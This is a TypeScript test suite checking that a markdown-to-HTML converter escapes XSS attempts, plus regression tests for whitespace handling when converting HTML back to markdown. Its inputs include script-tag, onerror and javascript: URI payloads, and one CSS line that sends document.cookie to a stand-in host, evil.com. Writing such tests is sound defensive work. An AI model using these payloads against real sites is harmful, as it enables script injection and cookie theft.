import { htmlToMarkdown, markdownToHtml } from "@/server/editor/conversionUtils";
import { JSDOM } from "jsdom";

/**
 * Tests that markdownToHtml does not produce HTML that could execute arbitrary
 * JavaScript in a browser. This matters in two contexts:
 *
 * 1. "Published" context: markdown content is converted to HTML and served to
 *    readers. If the HTML contains executable JS, any reader viewing the post
 *    is vulnerable.
 *
 * 2. "Editor/agent" context: agent API endpoints convert markdown to HTML, then
 *    parse it into Lexical nodes via $generateNodesFromDOM. Lexical provides an
 *    additional defense layer (it only creates nodes it recognizes), but we
 *    should not rely on that alone.
 *
 * markdownToHtml uses markdown-it with html:false (the default), which should
 * escape raw HTML tags. These tests verify that assumption holds.
 */

/**
 * Parses the HTML string for actual element attributes with the given name.
 * Returns false for:
 *  - Entity-escaped tags (`&lt;img onerror=...&gt;`) — not real elements
 *  - Attribute values that contain the name as a substring
 *    (`alt="...onerror..."`) — the name is inside a quoted value, not a
 *    standalone attribute
 *
 * Uses the JSDOM parser to be robust against regex edge cases.
 */
function hasRealAttribute(html: string, attrName: string): boolean {
  const dom = new JSDOM(`<body>${html}</body>`);
  const allElements = Array.from(dom.window.document.body.querySelectorAll("*"));
  return allElements.some(el => el.hasAttribute(attrName));
}

/**
 * Returns true if the HTML contains an `href` attribute whose value starts
 * with a given scheme (e.g. "javascript:" or "data:").
 */
function hasHrefWithScheme(html: string, scheme: string): boolean {
  const regex = new RegExp(`href\\s*=\\s*["']${scheme.replace(":", "\\:")}`, "i");
  return regex.test(html);
}

describe("markdownToHtml XSS safety", () => {
  describe("script injection via raw HTML in markdown", () => {
    it("escapes inline script tags", () => {
      const html = markdownToHtml("<script>alert('xss')</script>");
      expect(html).not.toContain("<script");
      expect(html).toContain("&lt;script&gt;");
    });

    it("escapes script tags mixed with normal markdown", () => {
      const html = markdownToHtml(
        "Hello **world**\n\n<script>document.cookie</script>\n\nGoodbye"
      );
      expect(html).not.toContain("<script");
      expect(html).toContain("<strong>world</strong>");
    });

    it("escapes img tags with onerror handlers", () => {
      const html = markdownToHtml('<img src=x onerror="alert(1)">');
      // The raw HTML should be entity-escaped by markdown-it (html:false),
      // so onerror should not appear as a real attribute in a tag.
      expect(hasRealAttribute(html, "onerror")).toBe(false);
    });

    it("escapes div tags with event handlers", () => {
      const html = markdownToHtml('<div onmouseover="alert(1)">hover me</div>');
      // The tag should be entity-escaped, so onmouseover is just text
      expect(hasRealAttribute(html, "onmouseover")).toBe(false);
    });

    it("escapes iframe injection attempts", () => {
      const html = markdownToHtml('<iframe src="https://evil.com"></iframe>');
      expect(html).not.toContain("<iframe");
    });

    it("escapes style tags that could exfiltrate data", () => {
      const html = markdownToHtml(
        '<style>body { background: url("https://evil.com/steal?cookie=" + document.cookie) }</style>'
      );
      expect(html).not.toContain("<style");
    });

    it("escapes nested/obfuscated script attempts", () => {
      const html = markdownToHtml('<scr<script>ipt>alert(1)</scr</script>ipt>');
      expect(html).not.toContain("<script");
    });
  });

  describe("javascript: URI injection via markdown links", () => {
    it("does not produce links with javascript: href", () => {
      const html = markdownToHtml("[click me](javascript:alert(1))");
      // markdown-it should either strip the href or not create a link at all
      expect(hasHrefWithScheme(html, "javascript:")).toBe(false);
    });

    it("does not produce links with javascript: href using mixed case", () => {
      const html = markdownToHtml("[click me](JaVaScRiPt:alert(1))");
      expect(hasHrefWithScheme(html, "javascript:")).toBe(false);
    });

    it("does not produce links with javascript: href using entity encoding", () => {
      const html = markdownToHtml("[click me](&#106;avascript:alert(1))");
      expect(hasHrefWithScheme(html, "javascript:")).toBe(false);
    });

    it("does not produce links with data: href containing HTML", () => {
      const html = markdownToHtml(
        "[click me](data:text/html,<script>alert(1)</script>)"
      );
      expect(hasHrefWithScheme(html, "data:")).toBe(false);
    });

    it("allows normal http/https links", () => {
      const html = markdownToHtml("[click me](https://example.com)");
      expect(html).toContain('href="https://example.com"');
    });
  });

  describe("markdown image injection", () => {
    it("does not produce img tags with event handler attributes", () => {
      // Markdown image syntax that tries to inject attributes via the alt text
      const html = markdownToHtml('![alt" onerror="alert(1)](https://example.com/img.png)');
      expect(hasRealAttribute(html, "onerror")).toBe(false);
    });
  });
});

/**
 * Regression: Lexical exports an italic-formatted whitespace-only text node
 * as `<i><span>&nbsp;</span></i>`, which Turndown classifies as a blank
 * element (since regex `\s` matches U+00A0) and routes through
 * `blankReplacement`. Turndown's `flankingWhitespace` pass — which would
 * normally inject a space outside the (empty) replacement — only matches
 * `[ \r\n\t]`, so it doesn't fire for NBSP; the `<i>` collapses to "" and
 * adjacent words around the italic-NBSP get joined together
 * (`and similar` → `andsimilar`).
 *
 * See agent feedback report 2026-04-27 for postId zcGmdQHX66NhC69v6.
 */
describe("htmlToMarkdown preserves whitespace inside blank inline formatting", () => {
  it("does not collide adjacent words around an italic-NBSP", () => {
    const html =
      '<p><span style="white-space: pre-wrap">and</span>' +
      '<i><span style="white-space: pre-wrap"> </span></i>' +
      '<span style="white-space: pre-wrap">similar results</span></p>';
    const md = htmlToMarkdown(html);
    expect(md).not.toContain("andsimilar");
    expect(md).toMatch(/and\s+similar results/);
  });

  it("does not collide adjacent words around a blank <em>NBSP</em>", () => {
    const html = "<p>alpha<em> </em>beta</p>";
    const md = htmlToMarkdown(html);
    expect(md).not.toContain("alphabeta");
    expect(md).toMatch(/alpha\s+beta/);
  });
});
